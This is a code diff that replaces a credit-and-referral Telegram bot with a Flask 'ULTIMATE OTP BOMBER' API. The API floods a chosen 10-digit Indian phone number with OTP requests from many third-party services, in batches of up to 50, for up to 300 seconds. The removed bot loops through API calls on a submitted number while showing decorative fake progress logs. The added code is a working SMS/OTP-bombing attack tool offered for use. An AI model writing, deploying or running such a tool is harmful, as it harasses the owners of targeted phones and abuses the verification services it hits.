+            # Continue bombing until duration ends
+            while time.time() < end_time:
+                # Create new batch with random APIs
+                batch_size = min(50, len(ULTIMATE_OTP_APIS))
+                selected_apis = random.sample(ULTIMATE_OTP_APIS, batch_size)
+                
+                tasks = []
+                for api in selected_apis:
+                    tasks.append(self.make_request(session, api, phone))
+                
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                
+                # Small delay between batches to prevent rate limiting
+                await asyncio.sleep(0.1)
+            
+            elapsed = time.time() - start_time
+            
+            return {
+                "phone": phone,
+                "total_apis": self.total_apis,
+                "success": self.success_count,
+                "failed": self.fail_count,
+                "duration": round(elapsed, 2),
+                "requests_per_second": round(self.success_count / elapsed, 2) if elapsed > 0 else 0
+            }
 
-API_FUNCS = [lambda code, c=cfg: call_api(c, code) for cfg in API_CONFIGS]
+# ==================================================================
+# 🌐 FLASK API SERVER
+# ==================================================================
+bomber = BomberEngine()
 
+@app.route('/')
+def home():
+    return jsonify({
+        "service": "🔥 ULTIMATE OTP BOMBER API",
+        "status": "online",
+        "endpoints": {
+            "/bomber?number=PHONE": "Start bombing a phone number",
+            "/bomber?number=PHONE&duration=SECONDS": "Start bombing for specific duration",
+            "/status": "Check service status",
+            "/apis": "Get list of all APIs"
+        },
+        "total_apis": len(ULTIMATE_OTP_APIS),
+        "version": "3.0.0"
+    })
 
-# -----------------------------------------------------------------------
-# Keyboards
-# -----------------------------------------------------------------------
-def main_keyboard() -> ReplyKeyboardMarkup:
-    return ReplyKeyboardMarkup([
-        [KeyboardButton("🚀 USE"),         KeyboardButton("✨ PREMIUM USE")],
-        [KeyboardButton("🎁 Refer & Earn"), KeyboardButton("👤 My Profile")],
-        [KeyboardButton("💎 Subscription"), KeyboardButton("👨‍💻 Developer")],
-    ], resize_keyboard=True, is_persistent=True)
-
-def join_keyboard() -> InlineKeyboardMarkup:
-    rows = [[InlineKeyboardButton(f"📢 {c['name']}", url=c["url"])] for c in db_list_channels()]
-    rows.append([InlineKeyboardButton("✅  Verify", callback_data="verify")])
-    return InlineKeyboardMarkup(rows)
-
-def stop_keyboard() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([[InlineKeyboardButton("🛑  STOP USE", callback_data="stop")]])
-
-def admin_keyboard() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("💰 Credits",  callback_data="adm_credits"),
-         InlineKeyboardButton("💎 Premium",  callback_data="adm_premium")],
-        [InlineKeyboardButton("📢 Channels", callback_data="adm_channels"),
-         InlineKeyboardButton("👑 Admins",   callback_data="adm_admins")],
-        [InlineKeyboardButton("📊 Stats",    callback_data="adm_stats"),
-         InlineKeyboardButton("⚙️ Status",   callback_data="adm_status")],
-        [InlineKeyboardButton("🎬 Video",    callback_data="adm_video"),
-         InlineKeyboardButton("ℹ️ User Info", callback_data="adm_userinfo")],
-        [InlineKeyboardButton("🎁 Gift Codes", callback_data="adm_gifts"),
-         InlineKeyboardButton("📣 Broadcast",  callback_data="adm_broadcast")],
-    ])
-
-def admin_back() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_home")]])
-
-
-# -----------------------------------------------------------------------
-# Progress
-# -----------------------------------------------------------------------
-SPINNER = ["🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚","🕛"]
-
-FAKE_LOGS = [
-    "📡 Establishing secure connection...",
-    "🔐 Authenticating request...",
-    "📤 Sending payload to server...",
-    "⚙️ Server is processing...",
-    "📥 Fetching response...",
-    "🔄 Parsing data stream...",
-    "🧬 Decoding results...",
-    "✨ Finalizing output...",
-]
-
-TIPS = [
-    "🐢 Turbo mode... at snail speed 😅",
-    "🍕 Order a pizza, this might take a sec...",
-    "🎩 Pulling something cool out of the hat...",
-    "🚀 Houston, we have liftoff...",
-    "🍿 Grab popcorn, show's about to start...",
-    "🦄 Unicorns are working overtime for you...",
-    "🎲 Rolling the dice of destiny...",
-    "😴 Don't fall asleep, almost there...",
-]
-
-def prog_bar(done, total):
-    n = int((done/total)*12)
-    return f"[{'█'*n}{'░'*(12-n)}] {int((done/total)*100)}%"
-
-def build_progress(done_flags, spinner, tick, elapsed, round_num):
-    total   = len(done_flags)
-    done    = sum(done_flags)
-    log_line = FAKE_LOGS[tick % len(FAKE_LOGS)]
-    tip      = TIPS[(tick // 6) % len(TIPS)]
-    lines = []
-    for i, cfg in enumerate(API_CONFIGS):
-        if done_flags[i]:
-            lines.append(f"  ✅  {cfg['emoji']} {cfg['name']} — Done")
-        else:
-            lines.append(f"  {spinner}  {cfg['emoji']} {cfg['name']} — Running")
-    return (
-        f"📟 *SYSTEM LOG* — Round {round_num}\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"{spinner} `{log_line}`\n\n"
-        f"{prog_bar(done, total)}\n\n"
-        + "\n".join(lines) +
-        f"\n\n━━━━━━━━━━━━━━━━━━━━\n"
-        f"_{tip}_\n"
-        f"⏱️ `{elapsed}s elapsed`"
-    )
-
-
-# -----------------------------------------------------------------------
-# Membership check — supports both old & new Telegram API
-# -----------------------------------------------------------------------
-async def is_member_of_all(context, user_id):
-    for ch in db_list_channels():
-        try:
-            m = await context.bot.get_chat_member(ch["chat_id"], user_id)
-            if m.status in ("left","kicked"):
-                return False
-        except Exception as e:
-            log.warning("Membership check failed %s: %s", ch["chat_id"], e)
-            return False
-    return True
-
-def get_forward_chat(message):
-    """Extract forwarded channel from message — handles both old & new Telegram API."""
-    # New API (v21+): forward_origin
-    fwd_origin = getattr(message, "forward_origin", None)
-    if fwd_origin is not None:
-        chat = getattr(fwd_origin, "chat", None)
-        if chat and getattr(chat, "type", None) == "channel":
-            return chat
-    # Old API fallback
-    fwd_chat = getattr(message, "forward_from_chat", None)
-    if fwd_chat and getattr(fwd_chat, "type", None) == "channel":
-        return fwd_chat
-    return None
-
-
-# -----------------------------------------------------------------------
-# Send video helper
-# -----------------------------------------------------------------------
-async def send_video_msg(context, chat_id, caption, reply_markup=None, reply_to=None):
-    """Send profile/start video. Falls back to text if video fails."""
-    video = get_video()
-    kwargs = dict(chat_id=chat_id, caption=caption, parse_mode=ParseMode.MARKDOWN)
-    if reply_markup:
-        kwargs["reply_markup"] = reply_markup
-    if reply_to:
-        kwargs["reply_to_message_id"] = reply_to
-
-    if video and video != "NONE":
-        try:
-            await context.bot.send_video(video=video, **kwargs)
-            return
-        except Exception as e:
-            log.warning("Video send failed: %s", e)
-    # Fallback to text
-    text_kwargs = dict(chat_id=chat_id, text=caption, parse_mode=ParseMode.MARKDOWN)
-    if reply_markup:
-        text_kwargs["reply_markup"] = reply_markup
-    await context.bot.send_message(**text_kwargs)
-
-
-# -----------------------------------------------------------------------
-# /start
-# -----------------------------------------------------------------------
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    referred_by = None
-    if context.args and context.args[0].startswith("ref_"):
-        try:
-            c = int(context.args[0].replace("ref_",""))
-            if c != user.id: referred_by = c
-        except ValueError: pass
-
-    if not db_get_user(user.id):
-        db_create_user(user.id, user.username or "", user.first_name or "", referred_by)
-
-    row      = db_get_user(user.id)
-    verified = row[4]
-    channels = db_list_channels()
-
-    if verified:
-        caption = (
-            f"👋 *Welcome back, {user.first_name}!*\n\n"
-            "Everything is set — choose an option below 👇"
-        )
-        await send_video_msg(context, update.effective_chat.id, caption, main_keyboard())
-        return
-
-    if not channels:
-        db_set_verified(user.id)
-        db_add_credits(user.id, CREDITS_ON_SIGNUP)
-        caption = (
-            f"✅ *Welcome, {user.first_name}!*\n\n"
-            f"🎁 You've received *{CREDITS_ON_SIGNUP} free credits* to get started!\n\n"
-            "Choose an option below 👇"
-        )
-        await send_video_msg(context, update.effective_chat.id, caption, main_keyboard())
-        return
-
-    await update.message.reply_text(
-        "🔐 *Access Restricted*\n\n"
-        "Please join the channel(s) below, then tap *Verify* ✅",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=join_keyboard(),
-    )
-
-
-# -----------------------------------------------------------------------
-# Verify
-# -----------------------------------------------------------------------
-async def on_verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user  = update.effective_user
-
-    if not await is_member_of_all(context, user.id):
-        await query.answer("❌ You haven't joined all required channels yet!", show_alert=True)
-        return
-
-    row          = db_get_user(user.id)
-    was_verified = row[4] if row else 0
-
-    if not was_verified:
-        db_set_verified(user.id)
-        db_add_credits(user.id, CREDITS_ON_SIGNUP)
-        referred_by      = row[5] if row else None
-        already_credited = row[6] if row else 0
-        if referred_by and not already_credited:
-            db_add_credits(referred_by, CREDITS_PER_REFERRAL)
-            db_mark_ref(user.id)
-        try:
-            await context.bot.send_message(OWNER_ID,
-                f"🆕 *New user verified!*\n\n"
-                f"👤 {user.first_name}\n🔗 @{user.username or 'N/A'}\n🆔 `{user.id}`",
-                parse_mode=ParseMode.MARKDOWN)
-        except Exception: pass
-
-    await query.message.delete()
-    caption = (
-        f"✅ *Verified! Welcome, {user.first_name}* 🎉\n\n"
-        f"🎁 *{CREDITS_ON_SIGNUP} free credits* added to your account!\n\n"
-        "Choose an option below 👇"
-    )
-    await send_video_msg(context, update.effective_chat.id, caption, main_keyboard())
-
-
-# -----------------------------------------------------------------------
-# Menu buttons
-# -----------------------------------------------------------------------
-MENU_BUTTONS = {"🚀 USE","✨ PREMIUM USE","🎁 Refer & Earn","👤 My Profile","💎 Subscription","👨‍💻 Developer"}
-
-async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not update.message:
-        return
-    text = (update.message.text or "").strip()
-    user = update.effective_user
-    if not user:
-        return
-
-    # Admin: awaiting channel forward
-    if context.user_data.get("awaiting_channel_forward"):
-        fwd_chat = get_forward_chat(update.message)
-        if fwd_chat:
-            context.user_data["awaiting_channel_forward"] = False
-            await _try_add_channel(update, context, fwd_chat.id)
-        else:
-            await update.message.reply_text(
-                "⚠️ *Couldn't detect the channel.*\n\n"
-                "Make sure you *forward a message directly from the channel* "
-                "(not a link, not copy-paste — use the Forward button).",
-                parse_mode=ParseMode.MARKDOWN,
-            )
-        return
-
-    # Admin: awaiting video
-    if context.user_data.get("awaiting_video") and update.message.video:
-        context.user_data["awaiting_video"] = False
-        file_id = update.message.video.file_id
-        db_set_setting("profile_video", file_id)
-        await update.message.reply_text("✅ *Dashboard video updated!*", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    # Menu button cancels code flow
-    if context.user_data.get("awaiting_code") and text in MENU_BUTTONS:
-        context.user_data["awaiting_code"] = False
-
-    # 10-digit code flow
-    if context.user_data.get("awaiting_code"):
-        if not text.isdigit() or len(text) != 10:
-            await update.message.reply_text(
-                "❌ *Invalid Code*\n\nMust be exactly *10 digits*. Try again 🔁",
-                parse_mode=ParseMode.MARKDOWN,
-            )
-            return
-        context.user_data["awaiting_code"] = False
-        row     = db_get_user(user.id)
-        premium = row[7] if row else 0
-        status_msg = await update.message.reply_text(
-            build_progress([False]*len(API_CONFIGS), SPINNER[0], 0, 0, 1),
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=stop_keyboard(),
-        )
-        task = asyncio.create_task(
-            run_all_apis(text, update, context, status_msg, user.id, premium))
-        context.user_data["running_task"] = task
-        return
-
-    # Menu routing
-    if text == "🚀 USE":
-        await handle_use(update, context)
-    elif text == "✨ PREMIUM USE":
-        await update.message.reply_text(
-            "✨ *Premium Use — Coming Soon!*\n\n"
-            "We're cooking something special 🔥 Stay tuned!",
-            parse_mode=ParseMode.MARKDOWN)
-    elif text == "🎁 Refer & Earn":
-        await handle_refer(update, context)
-    elif text == "👤 My Profile":
-        await handle_profile(update, context)
-    elif text == "💎 Subscription":
-        await update.message.reply_text(
-            f"💎 *Subscription*\n\nWant unlimited access?\n\n📩 Contact {SUBSCRIPTION_CONTACT}!",
-            parse_mode=ParseMode.MARKDOWN)
-    elif text == "👨‍💻 Developer":
-        await update.message.reply_text(
-            f"👨‍💻 *Developer*\n\nSupport, bugs, business 👉 {DEVELOPER_CONTACT} 🚀",
-            parse_mode=ParseMode.MARKDOWN)
-
-
-# -----------------------------------------------------------------------
-# Feature handlers
-# -----------------------------------------------------------------------
-async def handle_use(update, context):
-    user    = update.effective_user
-    row     = db_get_user(user.id)
-    credits = row[3] if row else 0
-    premium = row[7] if row else 0
-    if not premium and credits < CREDITS_PER_USE:
-        await update.message.reply_text(
-            "🚫 *Insufficient Credits*\n\n"
-            "You don't have enough credits.\n\n"
-            "🎁 Earn via *Refer & Earn*, or 💎 buy a *Subscription*!",
-            parse_mode=ParseMode.MARKDOWN)
-        return
-    context.user_data["awaiting_code"] = True
-    await update.message.reply_text(
-        "🔑 *Send Me the Code*\n\nPlease send your *10-digit code* to continue 👇",
-        parse_mode=ParseMode.MARKDOWN)
-
-
-async def handle_refer(update, context):
-    user = update.effective_user
-    link = f"https://t.me/{BOT_USERNAME}?start=ref_{user.id}"
-    refs = db_count_refs(user.id)
-    await update.message.reply_text(
-        "🎁 *Refer & Earn*\n\n"
-        f"Earn *{CREDITS_PER_REFERRAL} credits* for every friend who joins & verifies! 🚀\n\n"
-        f"👥 Successful referrals: *{refs}*\n\n"
-        "🔗 *Your referral link:*\n"
-        f"`{link}`\n\n"
-        "_Tap the link to copy, then share with friends!_",
-        parse_mode=ParseMode.MARKDOWN)
-
-
-async def handle_profile(update, context):
-    user    = update.effective_user
-    row     = db_get_user(user.id)
-    if not row:
-        await update.message.reply_text("❌ Profile not found. Try /start again.")
-        return
-    credits = row[3]
-    premium = row[7]
-    status  = "💎 *PREMIUM* ✨" if premium else "🆓 Free User"
-    caption = (
-        "👤 *Your Profile*\n\n"
-        f"📛 Name: {user.first_name}\n"
-        f"🔗 Username: @{user.username or 'N/A'}\n"
-        f"🆔 User ID: `{user.id}`\n"
-        f"💰 Credits: *{credits}*\n"
-        f"⭐ Status: {status}\n"
-    )
-    await send_video_msg(context, update.effective_chat.id, caption,
-                         reply_to=update.message.message_id)
-
-
-# -----------------------------------------------------------------------
-# STOP
-# -----------------------------------------------------------------------
-async def on_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer("Stopping... 🛑")
-    task = context.user_data.get("running_task")
-    if task and not task.done():
-        task.cancel()
-        try:
-            await query.edit_message_text(
-                "🛑 *Stopped.*\n\nProcess cancelled by you.",
-                parse_mode=ParseMode.MARKDOWN)
-        except Exception: pass
-    else:
-        await query.answer("Nothing running right now.", show_alert=True)
-
-
-# -----------------------------------------------------------------------
-# API runner — continuous loop
-# -----------------------------------------------------------------------
-def format_result(cfg, response) -> str:
-    emoji = cfg['emoji']
-    name  = html.escape(cfg['name'])
-    if not isinstance(response, dict):
-        return f"{emoji} <b>{name}</b>\n<pre>{html.escape(str(response))}</pre>"
-    sc = response.pop("_status_code", None)
-    sc_txt = f" <i>(HTTP {sc})</i>" if sc else ""
-    pretty = json.dumps(response, indent=2, ensure_ascii=False)
-    return f"{emoji} <b>{name}</b>{sc_txt}\n<pre>{html.escape(pretty)}</pre>"
-
-
-async def run_all_apis(code, update, context, status_msg, user_id, premium=0):
-    result_msg = None
-    round_num  = 0
-    TICK       = 0.5
-
+@app.route('/bomber')
+def bomb():
+    """Main bombing endpoint"""
+    phone = request.args.get('number', '').strip()
+    duration = int(request.args.get('duration', 30))
+    
+    if not phone:
+        return jsonify({"error": "Phone number required", "usage": "/bomber?number=9876543210"}), 400
+    
+    # Validate phone
+    country_code, clean_phone = validate_phone(phone)
+    if not clean_phone or len(clean_phone) != 10:
+        return jsonify({"error": "Invalid phone number. Use 10-digit Indian number."}), 400
+    
+    # Validate duration
+    if duration < 5:
+        duration = 5
+    elif duration > 300:
+        duration = 300
+    
+    # Run bombing
     try:
-        while True:
-            round_num += 1
-            tasks = [asyncio.ensure_future(fn(code)) for fn in API_FUNCS]
-            tick  = 0
-
-            while not all(t.done() for t in tasks):
-                spinner    = SPINNER[tick % len(SPINNER)]
-                done_flags = [t.done() for t in tasks]
-                elapsed    = int(tick * TICK)
-                try:
-                    await status_msg.edit_text(
-                        build_progress(done_flags, spinner, tick, elapsed, round_num),
-                        parse_mode=ParseMode.MARKDOWN,
-                        reply_markup=stop_keyboard(),
-                    )
-                except Exception: pass
-                await asyncio.sleep(TICK)
-                tick += 1
-
-            # Collect results
-            results = []
-            for i, t in enumerate(tasks):
-                try:
-                    r = t.result()
-                    db_log_api(user_id, code, API_CONFIGS[i]["name"], 1)
-                    results.append(r)
-                except Exception as e:
-                    db_log_api(user_id, code, API_CONFIGS[i]["name"], 0)
-                    results.append({"error": str(e)})
-
-            # Show 100% complete
-            try:
-                await status_msg.edit_text(
-                    build_progress([True]*len(API_CONFIGS), "✅", tick, int(tick*TICK), round_num),
-                    parse_mode=ParseMode.MARKDOWN,
-                )
-            except Exception: pass
-
-            formatted = [format_result(API_CONFIGS[i], results[i]) for i in range(len(results))]
-            blocks    = f"🔄 <b>Round {round_num} — Results</b>\n\n" + "\n\n".join(formatted)
-
-            db_add_credits(user_id, -CREDITS_PER_USE if not premium else 0)
-
-            if result_msg is None:
-                result_msg = await update.message.reply_text(
-                    blocks, parse_mode=ParseMode.HTML, reply_markup=stop_keyboard())
-            else:
-                try:
-                    await result_msg.edit_text(
-                        blocks, parse_mode=ParseMode.HTML, reply_markup=stop_keyboard())
-                except Exception: pass
-
-            # Reset progress for next round
-            try:
-                await status_msg.edit_text(
-                    build_progress([False]*len(API_CONFIGS), SPINNER[0], 0, 0, round_num+1),
-                    parse_mode=ParseMode.MARKDOWN,
-                    reply_markup=stop_keyboard(),
-                )
-            except Exception: pass
-
-            await asyncio.sleep(1.5)
-
-    except asyncio.CancelledError:
-        for t in (tasks if 'tasks' in dir() else []):
-            if not t.done(): t.cancel()
-        raise
-
-
-# -----------------------------------------------------------------------
-# Admin decorators
-# -----------------------------------------------------------------------
-def admin_only(func):
-    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not db_is_admin(update.effective_user.id):
-            await update.message.reply_text("🚫 Admins only."); return
-        return await func(update, context)
-    return wrapper
-
-def owner_only(func):
-    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if update.effective_user.id != OWNER_ID:
-            await update.message.reply_text("🚫 Owner only."); return
-        return await func(update, context)
-    return wrapper
-
-
-# -----------------------------------------------------------------------
-# Admin commands
-# -----------------------------------------------------------------------
-@admin_only
-async def admin_panel(update, context):
-    await update.message.reply_text(
-        "🛠️ *Admin Panel*\n\nChoose a category 👇",
-        parse_mode=ParseMode.MARKDOWN, reply_markup=admin_keyboard())
-
-@admin_only
-async def admin_addcredit(update, context):
-    try: tid,amt = int(context.args[0]),int(context.args[1])
-    except: await update.message.reply_text("⚠️ `/addcredit <uid> <amount>`",parse_mode=ParseMode.MARKDOWN); return
-    if not db_get_user(tid): await update.message.reply_text("❌ User not found."); return
-    db_add_credits(tid,amt)
-    await update.message.reply_text(f"✅ Added *{amt}* credits to `{tid}`.",parse_mode=ParseMode.MARKDOWN)
-
-@admin_only
-async def admin_removecredit(update, context):
-    try: tid,amt = int(context.args[0]),int(context.args[1])
-    except: await update.message.reply_text("⚠️ `/removecredit <uid> <amount>`",parse_mode=ParseMode.MARKDOWN); return
-    if not db_get_user(tid): await update.message.reply_text("❌ User not found."); return
-    db_add_credits(tid,-amt)
-    await update.message.reply_text(f"✅ Removed *{amt}* credits from `{tid}`.",parse_mode=ParseMode.MARKDOWN)
-
-@admin_only
-async def admin_setcredit(update, context):
-    try: tid,amt = int(context.args[0]),int(context.args[1])
-    except: await update.message.reply_text("⚠️ `/setcredit <uid> <amount>`",parse_mode=ParseMode.MARKDOWN); return
-    if not db_set_credits(tid,amt): await update.message.reply_text("❌ User not found."); return
-    await update.message.reply_text(f"✅ Set `{tid}` credits to *{amt}*.",parse_mode=ParseMode.MARKDOWN)
-
-@admin_only
-async def admin_addpremium(update, context):
-    try: tid = int(context.args[0])
-    except: await update.message.reply_text("⚠️ `/addpremium <uid>`",parse_mode=ParseMode.MARKDOWN); return
-    if not db_set_premium(tid,1): await update.message.reply_text("❌ User not found."); return
-    await update.message.reply_text(f"💎 `{tid}` is now *PREMIUM*.",parse_mode=ParseMode.MARKDOWN)
-    try: await context.bot.send_message(tid,"💎 *You're now PREMIUM!* Unlimited USE — no credits needed! 🚀",parse_mode=ParseMode.MARKDOWN)
-    except: pass
-
-@admin_only
-async def admin_removepremium(update, context):
-    try: tid = int(context.args[0])
-    except: await update.message.reply_text("⚠️ `/removepremium <uid>`",parse_mode=ParseMode.MARKDOWN); return
-    if not db_set_premium(tid,0): await update.message.reply_text("❌ User not found."); return
-    await update.message.reply_text(f"✅ Premium removed from `{tid}`.",parse_mode=ParseMode.MARKDOWN)
-
-@admin_only
-async def admin_userinfo(update, context):
-    try: tid = int(context.args[0])
-    except: await update.message.reply_text("⚠️ `/userinfo <uid>`",parse_mode=ParseMode.MARKDOWN); return
-    row = db_get_user(tid)
-    if not row: await update.message.reply_text("❌ User not found."); return
-    _,uname,fname,credits,verified,ref_by,_,premium = row
-    await update.message.reply_text(
-        f"📋 *User Info*\n\n"
-        f"📛 {fname}\n🔗 @{uname or 'N/A'}\n🆔 `{tid}`\n"
-        f"💰 Credits: *{credits}*\n"
-        f"⭐ Premium: {'Yes 💎' if premium else 'No'}\n"
-        f"✅ Verified: {'Yes' if verified else 'No'}\n"
-        f"👥 Referred by: `{ref_by or 'N/A'}`",
-        parse_mode=ParseMode.MARKDOWN)
-
-@admin_only
-async def admin_offbot(update, context):
-    db_set_setting("bot_enabled","0")
-    await update.message.reply_text("🔴 *Bot is now OFF.*",parse_mode=ParseMode.MARKDOWN)
-
-@admin_only
-async def admin_onbot(update, context):
-    db_set_setting("bot_enabled","1")
-    await update.message.reply_text("🟢 *Bot is now ON.*",parse_mode=ParseMode.MARKDOWN)
-
-@admin_only
-async def admin_listadmins(update, context):
-    ids = db_list_admins()
-    lines = [f"👑 `{OWNER_ID}` (owner)"] + [f"🛠️ `{i}`" for i in ids]
-    await update.message.reply_text("📋 *Admins*\n\n"+"\n".join(lines),parse_mode=ParseMode.MARKDOWN)
-
-@owner_only
-async def admin_addadmin(update, context):
-    try: tid = int(context.args[0])
-    except: await update.message.reply_text("⚠️ `/addadmin <uid>`",parse_mode=ParseMode.MARKDOWN); return
-    db_add_admin(tid, update.effective_user.id)
-    await update.message.reply_text(f"✅ `{tid}` is now an admin.",parse_mode=ParseMode.MARKDOWN)
-    try: await context.bot.send_message(tid,"🛠️ *You've been granted admin access!* Send /admin.",parse_mode=ParseMode.MARKDOWN)
-    except: pass
-
-@owner_only
-async def admin_removeadmin(update, context):
-    try: tid = int(context.args[0])
-    except: await update.message.reply_text("⚠️ `/removeadmin <uid>`",parse_mode=ParseMode.MARKDOWN); return
-    if tid==OWNER_ID: await update.message.reply_text("🚫 Owner can't be removed."); return
-    if not db_remove_admin(tid): await update.message.reply_text("❌ Not an admin."); return
-    await update.message.reply_text(f"✅ `{tid}` removed.",parse_mode=ParseMode.MARKDOWN)
-
-@admin_only
-async def admin_addchannel(update, context):
-    if not context.args:
-        context.user_data["awaiting_channel_forward"] = True
-        await update.message.reply_text(
-            "📢 *Add Force-Join Channel*\n\n"
-            "For *public* channel: `/addchannel @username`\n\n"
-            "For *private* channel:\n"
-            "1️⃣ Make bot *admin* in that channel\n"
-            "2️⃣ Open the channel\n"
-            "3️⃣ Tap any message → Forward → Forward to this bot chat\n\n"
-            "⚠️ Bot must be *admin* in channel first!",
-            parse_mode=ParseMode.MARKDOWN)
-        return
-    raw = context.args[0]
-    username = raw.replace("https://t.me/","").replace("http://t.me/","").lstrip("@").strip()
-    if username.startswith("+") or "joinchat" in username:
-        await update.message.reply_text("⚠️ Private channel — run `/addchannel` with no args and forward a post.",parse_mode=ParseMode.MARKDOWN); return
-    await _try_add_channel(update, context, f"@{username}")
-
-@admin_only
-async def admin_removechannel(update, context):
-    try: cid = context.args[0]
-    except: await update.message.reply_text("⚠️ `/removechannel <chat_id>`",parse_mode=ParseMode.MARKDOWN); return
-    if not db_remove_channel(cid): await update.message.reply_text("❌ Channel not found."); return
-    await update.message.reply_text("✅ Channel removed.")
-
-@admin_only
-async def admin_listchannels(update, context):
-    chs = db_list_channels()
-    if not chs: await update.message.reply_text("📭 No channels. Use /addchannel."); return
-    lines = [f"📢 *{c['name']}*\nID: `{c['chat_id']}`" for c in chs]
-    await update.message.reply_text("📋 *Force-Join Channels*\n\n"+"\n\n".join(lines),parse_mode=ParseMode.MARKDOWN)
-
-@admin_only
-async def admin_setvideo(update, context):
-    if update.message.reply_to_message and update.message.reply_to_message.video:
-        file_id = update.message.reply_to_message.video.file_id
-    elif context.args:
-        file_id = context.args[0]
-    else:
-        context.user_data["awaiting_video"] = True
-        await update.message.reply_text("🎬 Send the video file now 👇",parse_mode=ParseMode.MARKDOWN); return
-    db_set_setting("profile_video", file_id)
-    await update.message.reply_text("✅ *Video updated!*",parse_mode=ParseMode.MARKDOWN)
-    try: await context.bot.send_video(update.effective_chat.id, file_id, caption="Preview 👆")
-    except Exception as e: await update.message.reply_text(f"⚠️ Set but preview failed: {e}")
-
-@admin_only
-async def admin_clearvideo(update, context):
-    db_set_setting("profile_video","NONE")
-    await update.message.reply_text("✅ Video removed. Profile shows text only.")
-
-@admin_only
-async def admin_apitest(update, context):
-    test_code = context.args[0] if context.args else "1234567890"
-    msg = await update.message.reply_text(f"🧪 Testing with code `{test_code}`...",parse_mode=ParseMode.MARKDOWN)
-    lines = []
-    for cfg in API_CONFIGS:
-        style = cfg.get("param_style","query")
-        pname = cfg.get("param_name","phone")
-        url   = cfg["url"]
-        if style=="path": preview = f"{url.rstrip('/')}/{test_code}"
-        elif style=="query": preview = f"{url}?{pname}={test_code}"
-        else: preview = url
-        result = await call_api(cfg, test_code)
-        pretty = json.dumps(result, indent=2, ensure_ascii=False)
-        lines.append(f"{cfg['emoji']} <b>{html.escape(cfg['name'])}</b>\n🔗 <code>{html.escape(preview)}</code>\n<pre>{html.escape(pretty[:400])}</pre>")
-    await msg.edit_text("🧪 <b>API Test Results</b>\n\n"+"\n\n".join(lines),parse_mode=ParseMode.HTML)
-
-@admin_only
-async def admin_stats(update, context):
-    s = db_get_stats()
-    await update.message.reply_text(
-        "📊 *Bot Statistics*\n\n"
-        f"👥 Total users: *{s['total_users']}*\n"
-        f"✅ Verified users: *{s['verified']}*\n\n"
-        f"🚀 Total API uses: *{s['total_uses']}*\n"
-        f"👤 Unique users who used API: *{s['unique_users']}*\n"
-        f"🔢 Unique codes submitted: *{s['unique_codes']}*\n\n"
-        f"🕐 First API use: `{s['first_use']}`\n"
-        f"🕐 Last API use: `{s['last_use']}`",
-        parse_mode=ParseMode.MARKDOWN)
-
-
-@admin_only
-# -----------------------------------------------------------------------
-# Gift Code system
-# -----------------------------------------------------------------------
-@admin_only
-async def admin_giftcode(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """
-    Create a gift code.
-    Usage: /giftcode <CODE> <credits> [max_uses]
-    Example: /giftcode WELCOME50 5 100
-    If no code given, a random one is generated.
-    """
-    import random, string
-
-    args = context.args
-    if not args:
-        # Generate random code
-        code     = "GIFT-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
-        credits  = 2
-        max_uses = 1
-    elif len(args) == 1:
-        code     = args[0]
-        credits  = 2
-        max_uses = 1
-    elif len(args) == 2:
-        code     = args[0]
-        try: credits = int(args[1])
-        except: await update.message.reply_text("⚠️ Credits must be a number."); return
-        max_uses = 1
-    else:
-        code     = args[0]
-        try: credits  = int(args[1]); max_uses = int(args[2])
-        except: await update.message.reply_text("⚠️ Usage: `/giftcode <CODE> <credits> <max_uses>`", parse_mode=ParseMode.MARKDOWN); return
-
-    db_create_gift(code, credits, max_uses, update.effective_user.id)
-    await update.message.reply_text(
-        f"🎁 *Gift Code Created!*\n\n"
-        f"🔑 Code: `{code.upper()}`\n"
-        f"💰 Credits: *{credits}*\n"
-        f"👥 Max uses: *{max_uses}*\n\n"
-        f"Users can redeem with:\n`/redeem {code.upper()}`",
-        parse_mode=ParseMode.MARKDOWN,
-    )
-
-@admin_only
-async def admin_deletegift(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args:
-        await update.message.reply_text("⚠️ Usage: `/deletegift <CODE>`", parse_mode=ParseMode.MARKDOWN); return
-    code = context.args[0]
-    if db_deactivate_gift(code):
-        await update.message.reply_text(f"✅ Gift code `{code.upper()}` deactivated.", parse_mode=ParseMode.MARKDOWN)
-    else:
-        await update.message.reply_text("❌ Code not found.")
-
-@admin_only
-async def admin_listgifts(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    gifts = db_list_gifts()
-    if not gifts:
-        await update.message.reply_text("📭 No gift codes yet. Use /giftcode to create one.")
-        return
-    lines = []
-    for g in gifts:
-        code, credits, max_uses, used, active = g
-        status = "✅" if active else "❌"
-        lines.append(f"{status} `{code}` — {credits} cr | {used}/{max_uses} used")
-    await update.message.reply_text(
-        "🎁 *Gift Codes* (last 20)\n\n" + "\n".join(lines),
-        parse_mode=ParseMode.MARKDOWN,
-    )
-
-# User redeem command — works for everyone
-async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    row  = db_get_user(user.id)
-    if not row or not row[4]:
-        await update.message.reply_text(
-            "❌ *Please verify first!*\n\nSend /start to join and verify.",
-            parse_mode=ParseMode.MARKDOWN,
-        ); return
-
-    if not context.args:
-        await update.message.reply_text(
-            "🎁 *Redeem a Gift Code*\n\nUsage: `/redeem YOUR_CODE`",
-            parse_mode=ParseMode.MARKDOWN,
-        ); return
-
-    code  = context.args[0].upper()
-    gift  = db_get_gift(code)
-
